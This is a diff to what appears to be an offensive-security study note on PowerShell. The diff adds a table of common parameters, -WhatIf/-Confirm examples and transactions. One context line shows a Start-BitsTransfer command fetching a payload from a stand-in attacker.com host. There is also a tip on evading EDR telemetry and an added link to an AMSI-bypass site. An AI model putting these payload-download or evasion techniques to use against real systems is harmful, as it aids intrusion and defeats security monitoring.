@@ -22,8 +22,13 @@ PowerShell is commonly used for tasks like:
 > [!tip] If you need to stay stealthy and PowerShell's capabilities aren't required, CMD is quieter. PowerShell tends to generate more telemetry and is heavily monitored by modern EDR solutions. 
 >- See [[Windows CMD]].
 
-### How PowerShell works (in a nutshell)
+>[!tip]+
+>Websites where you can check PowerShell commands or scripts quickly, free and without registration: 
+>- [`HCODX — Online PowerShell Compiler`](https://hcodx.com/compiler/powershell)
+>- [`tio.run — PowerShell`](https://tio.run/#powershell)
+>- [`CoreInterview`](https://codeinterview.io/languages/powershell)
 
+### How PowerShell works (in a nutshell)
 
 - **PowerShell operates on .NET objects, not text.**
 	- Cmdlets output **structured data objects** with properties and methods rather than text strings.
@@ -774,6 +779,118 @@ Get-Service | Get-Member | Where-Object MemberType -eq Property
 - Others come from modules that are either loaded on-demand or must be installed.
 - Many Microsoft products add custom cmdlets, such as Microsoft Exchange Server (`ExchangeOnlineManagement` module), Microsoft Azure (`Az`), and Active Directory (`ActiveDirectory`).
 
+
+### Common parameters
+
+>[!note] See [`Common Parameter Names — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/scripting/developer/cmdlet/common-parameter-names?view=powershell-7.5) and [`Common Parameters — SS64`](https://ss64.com/ps/common.html).
+
+
+All cmdlets automatically support a set of common, standardized parameters:
+
+#### General common parameters
+
+| Parameter                     | Description                                                                                                                                           |
+| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `-Debug`, `-db`               | Show developer/debug messages (from `Write-Debug`). Overrides `$DebugPreference`.                                                                     |
+| `-ErrorAction`, `-ea`         | Specify how non-terminating error messages are handled.<br>Values: `Continue`, `Stop`, `SilentlyContinue`, `Inquire`, `Ignore`, `Suspend` (workflow). |
+| `-ErrorVariable`, `-ev`       | Store error messages in a variable (append with `+`).                                                                                                 |
+| `-InformationAction`, `-infa` | Specify how information messages are handled (`Write-Information`).<br>Values: `Continue`, `Stop`, `SilentlyContinue`, `Inquire`, `Ignore`.           |
+| `-InformationVariable`, `-iv` | Store informational messages in a variable.                                                                                                           |
+| `-OutBuffer`, `-ob`           | Buffer a specified number of objects before passing to next pipeline stage.                                                                           |
+| `-OutVariable`, `-ov`         | Store command output in a variable (append with `+`).                                                                                                 |
+| `-ProgressAction`, `-proga`   | Specify how progress messages (progress bars) are handled (`Write-Progress`).<br>Values: `Continue`, `Stop`, `SilentlyContinue`, `Inquire`, `Ignore`. |
+| `-Verbose`, `-vb`             | Show detailed operation messages (`Write-Verbose`). Overrides `$VerbosePreference`.                                                                   |
+| `-WarningAction`, `-wa`       | Specify how warning messages are handled (`Write-Warning`).<br>Values: `Continue`, `Stop`, `SilentlyContinue`, `Inquire`, `Ignore`.                   |
+| `-WarningVariable`, `-wv`     | Store warning messages in a variable.                                                                                                                 |
+
+- Show verbose output:
+
+```powershell
+Get-Process -Verbose
+```
+
+- Show debug output:
+
+```powershell
+Get-Process -Debug
+```
+
+- Stop on the first non-terminating error:
+
+```powershell
+Get-Item "C:\Nope.txt" -ErrorAction Stop
+```
+
+- Capture errors in the `$err` variable:
+
+```powershell
+Get-Item "C:\Nope.txt" -ErrorVariable err
+```
+
+- Suppress informational messages:
+
+```powershell
+Get-Service -InformationAction SilentlyContinue
+```
+
+
+- Capture informational messages in the `$info` variable:
+
+```powershell
+Get-Service -InformationVariable info
+```
+
+- Save the output to `$files` (but still send it down the pipeline):
+
+```powershell
+Get-ChildItem -OutVariable files
+```
+
+- Suppress the progress bar for commands that normally show one:
+
+```powershell
+Copy-Item file1.txt file2.txt -ProgressAction SilentlyContinue
+```
+
+- Ensure warnings are displayed (default behavior):
+
+```powershell
+Remove-Item "C:\Temp" -WarningAction Continue
+```
+#### Risk-mitigation parameters
+
+| Parameter         | Description                                                                        |
+| ----------------- | ---------------------------------------------------------------------------------- |
+| `-Confirm` ,`-cf` | Prompt before executing potentially risky actions. Overrides `$ConfirmPreference`. |
+| `-WhatIf`, `-wi`  | Show what would happen without executing the command.                              |
+- Ask for confirmation before running:
+
+```powershell
+Stop-Service Spooler -Confirm
+```
+
+- Simulate the command without executing it:
+
+```powershell
+Stop-Service Spooler -WhatIf
+```
+#### Transaction parameters
+
+| Parameter                   | Description                                                                                                 |
+| --------------------------- | ----------------------------------------------------------------------------------------------------------- |
+| `-UseTransaction`, `-usetx` | Include the command in an active PowerShell transaction. Only works with cmdlets that support transactions. |
+
+- Execute within a transaction:
+
+```powershell
+Start-Transaction
+Set-Item HKCU:\Test\Value 42 -UseTransaction
+Complete-Transaction
+```
+
+>[!interesting]+ Transactions
+>A **transaction** is a temporary, reversible "session" in which multiple operations are grouped together. If _all_ operations succeed → the transaction is **committed**. If _any_ operation fails → the transaction can be **rolled back**. Like "Atomicity" in databases' [ACID](https://en.wikipedia.org/wiki/ACID).
+>- See [`about_Transactions — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_transactions?view=powershell-5.1).
 ## PowerShell modules
 
 >A **PowerShell module** is a self-contained, distributable unit of PowerShell code that packages related functions, cmdlets, variables, aliases, and other resources built around a common purpose.
@@ -2654,12 +2771,14 @@ Start-BitsTransfer -Source "http://attacker.com/payload.exe" -Destination "C:\Te
 
 - [`about_Output_Streams — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_output_streams?view=powershell-7.5)
 - [`Common Parameters — SS64`](https://ss64.com/ps/common.html)
+[`Common Parameter Names — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/scripting/developer/cmdlet/common-parameter-names?view=powershell-7.5)
 - [`about_PSModulePath — Mirosoft Learn`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath?view=powershell-7.5)
 - [`about_Module_Manifests — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_module_manifests?view=powershell-7.6&ref=benheater.com)
 - [`Creating a PowerShell Module — 0xBEN`](https://benheater.com/creating-a-powershell-module/)
 
 - [`Approved Verbs for PowerShell Commands — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7.5)
-
+- [`AMSI.fail`](https://amsi.fail/)
+- [`about_Transactions — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_transactions?view=powershell-5.1)
 ## Appendix A: Common aliases
 
 |Alias|Full Cmdlet|
